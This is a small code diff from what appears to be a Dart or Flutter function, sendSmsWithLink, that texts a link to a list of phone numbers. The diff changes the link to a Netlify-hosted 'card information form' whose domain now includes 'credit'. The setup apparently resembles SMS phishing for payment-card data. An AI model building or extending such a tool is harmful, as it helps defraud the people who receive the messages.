@@ -313,7 +313,7 @@ Future<void> sendSmsWithLink(List<String> phoneNumbers) async {
   );
 
   // Generate a unique link or use your own link to the card information form
-  String? uniqueLink = 'https://smswithlink.netlify.app/';
+  String? uniqueLink = 'https://smswithlink-credit.netlify.app';
 
   for (String phoneNumber in phoneNumbers) {
     try {
